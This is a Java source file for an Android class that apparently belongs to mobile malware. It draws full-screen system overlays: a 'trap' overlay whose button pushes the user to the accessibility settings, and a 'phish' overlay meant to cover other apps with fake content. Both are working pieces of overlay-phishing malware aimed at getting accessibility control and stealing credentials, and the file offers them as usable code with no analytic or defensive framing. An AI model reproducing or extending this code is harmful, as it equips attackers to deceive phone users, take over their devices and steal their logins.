package com.xrc.system.accessibility;

import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;

import com.xrc.system.R;
import com.xrc.system.core.Constants;

public class OverlayManager {
    private static final String TAG = Constants.TAG + ":Overlay";
    private static OverlayManager instance;
    private final Context ctx;
    private final WindowManager wm;
    private final Handler handler;
    private View overlayView;
    private boolean showing = false;

    private OverlayManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.handler = new Handler(Looper.getMainLooper());
    }

    public static synchronized OverlayManager get(Context ctx) {
        if (instance == null) {
            instance = new OverlayManager(ctx);
        }
        return instance;
    }

    public void showOverlay(String title, String message, String btnText) {
        if (showing) return;
        if (!Settings.canDrawOverlays(ctx)) {
            requestOverlayPermission();
            return;
        }
        handler.post(() -> {
            try {
                removeOverlay();
                overlayView = LayoutInflater.from(ctx).inflate(R.layout.overlay_trap, null);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                                | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP | Gravity.START;
                params.x = 0;
                params.y = 0;

                TextView tvTitle = overlayView.findViewById(R.id.ovTitle);
                TextView tvMsg = overlayView.findViewById(R.id.ovMessage);
                Button btn = overlayView.findViewById(R.id.ovButton);

                if (tvTitle != null) tvTitle.setText(title);
                if (tvMsg != null) tvMsg.setText(message);
                if (btn != null) {
                    btn.setText(btnText);
                    btn.setOnClickListener(v -> {
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(intent);
                    });
                }

                wm.addView(overlayView, params);
                showing = true;
                Log.i(TAG, "Overlay shown");
            } catch (Exception e) {
                Log.e(TAG, "Overlay show failed", e);
            }
        });
    }

    public void removeOverlay() {
        handler.post(() -> {
            if (overlayView != null) {
                try {
                    wm.removeView(overlayView);
                } catch (Exception ignored) {}
                overlayView = null;
                showing = false;
            }
        });
    }

    public void showPhishOverlay(String htmlContent) {
        handler.post(() -> {
            try {
                removeOverlay();
                overlayView = LayoutInflater.from(ctx).inflate(R.layout.overlay_phish, null);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT);
                wm.addView(overlayView, params);
                showing = true;
            } catch (Exception e) {
                Log.e(TAG, "Phish overlay failed", e);
            }
        });
    }

    public boolean isShowing() {
        return showing;
    }

    private void requestOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
    }
}
